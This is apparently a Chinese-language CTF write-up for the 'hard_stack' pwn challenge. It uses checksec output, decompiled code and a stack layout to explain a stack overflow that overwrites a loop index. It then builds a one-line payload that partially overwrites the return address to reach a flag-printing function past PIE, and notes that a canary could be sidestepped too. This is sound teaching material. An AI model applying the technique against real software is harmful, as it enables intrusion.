先 `checksec` 一下
```sh
┌──(kali㉿helloeveryone)-[~/ctf/pwn/q20_hardstack]
└─$ checksec --file=hard_stack
[*] '/home/kali/ctf/pwn/q20_hardstack/hard_stack'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
没有金丝雀, 地址随机化, 用户栈不可执行

再丢进ida看眼，`F5`一下

main:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+18h] [rbp-8h]

  setvbuf(stdout, 0LL, 2, 0LL);
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Something wrong with flag file.");
    exit(0);
  }
  fgets(s, 64, stream);//将字符串读到s中
  sub_400acd();
  puts("Bye~");
  return 0;
}
```

sub_400acd:
```c
ssize_t sub_400acd()
{
  ssize_t result; // rax
  char buf[45]; // [rsp+Fh] [rbp-31h] BYREF
  int i; // [rsp+3Ch] [rbp-4h]

  puts("Who are you?");
  for ( i = 0; ; ++i )
  {
    result = read(0, buf, 1uLL);                //一次从缓冲区读一个字节
    if ( result != 1 )
      break;
    result = (unsigned __int8)buf[0];
    if ( buf[0] == '\n' )
      break;
    buf[i + 1] = buf[0];                        // 漏洞:只要没有读入换行符或EOF就会一直读，造成栈溢出
  }
  return result;                                // 可以劫持程序流程
}
```
在ida里看看其他函数

找到一个获得flag的函数 `sub_40076d`
```c
int sub_40067d()
{
  return puts(s);                               //s即为刚刚读取flag的字符串地址
}
```
现在可以分析一下漏洞函数 `sub_400acd` 的栈了
```
-0000000000000040                 db ? ; undefined
-000000000000003F                 db ? ; undefined
-000000000000003E                 db ? ; undefined
-000000000000003D                 db ? ; undefined
-000000000000003C                 db ? ; undefined
-000000000000003B                 db ? ; undefined
-000000000000003A                 db ? ; undefined
-0000000000000039                 db ? ; undefined
-0000000000000038                 db ? ; undefined
-0000000000000037                 db ? ; undefined
-0000000000000036                 db ? ; undefined
-0000000000000035                 db ? ; undefined
-0000000000000034                 db ? ; undefined
-0000000000000033                 db ? ; undefined
-0000000000000032                 db ? ; undefined
-0000000000000031 buf             db ?
-0000000000000030 var_30          db ?
-000000000000002F                 db ? ; undefined
-000000000000002E                 db ? ; undefined
-000000000000002D                 db ? ; undefined
-000000000000002C                 db ? ; undefined
-000000000000002B                 db ? ; undefined
-000000000000002A                 db ? ; undefined
-0000000000000029                 db ? ; undefined
-0000000000000028                 db ? ; undefined
-0000000000000027                 db ? ; undefined
-0000000000000026                 db ? ; undefined
-0000000000000025                 db ? ; undefined
-0000000000000024                 db ? ; undefined
-0000000000000023                 db ? ; undefined
-0000000000000022                 db ? ; undefined
-0000000000000021                 db ? ; undefined
-0000000000000020                 db ? ; undefined
-000000000000001F                 db ? ; undefined
-000000000000001E                 db ? ; undefined
-000000000000001D                 db ? ; undefined
-000000000000001C                 db ? ; undefined
-000000000000001B                 db ? ; undefined
-000000000000001A                 db ? ; undefined
-0000000000000019                 db ? ; undefined
-0000000000000018                 db ? ; undefined
-0000000000000017                 db ? ; undefined
-0000000000000016                 db ? ; undefined
-0000000000000015                 db ? ; undefined
-0000000000000014                 db ? ; undefined
-0000000000000013                 db ? ; undefined
-0000000000000012                 db ? ; undefined
-0000000000000011                 db ? ; undefined
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004 var_4           dd ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```
`buf` 和 `var_30` 占45字节，属于 `buf[45]` , `var_4` 则是变量 `i` 

由此，可以有一种思路: 将 `buf` 溢出覆盖 `i` 实现栈上任意写

构造payload:
```python
payload=b'a'*44+b'\x37'+b'\x42'
```
前44个a是垃圾占位字符，填充 `-0000000000000030` 到 `-0000000000000005` (ps:因为 `-0000000000000031` 总是储存当前字符)

后面写一个 `0x37` , 即将 `i` 改成55。这是考虑到for循环后要有 `i++` , 即下一次写入的地址是 `buf[(i++)+1]` , 此地址即为 `buf[57]` = `-0x31+0x39=0x8` , 就是返回地址的第一个字节

下面解释payload最后一字节:

首先，地址随机化只是进行页的随机化，一页的大小是 `0x1000` , 也就是说同一页上地址的后三位不会改变。

其次，小端储存，是指以字节为单位，低数位储存在低地址，高数位储存在高地址。返回地址是 `call    _sub_400acd` 指令的下一条，地址即 `0x00000000000008D8` , 所以我们最后是将上述地址覆盖成 `0x0000000000000842` , 这正是 `sub_40067d()` 的地址。这样我们就把程序劫持到该函数上打印flag

PS: 由于金丝雀是在栈上变量之后， `rbp` 和返回地址之前，我们可以通过数组索引避开金丝雀实现栈溢出，所以本题开了 `canary` 也可以做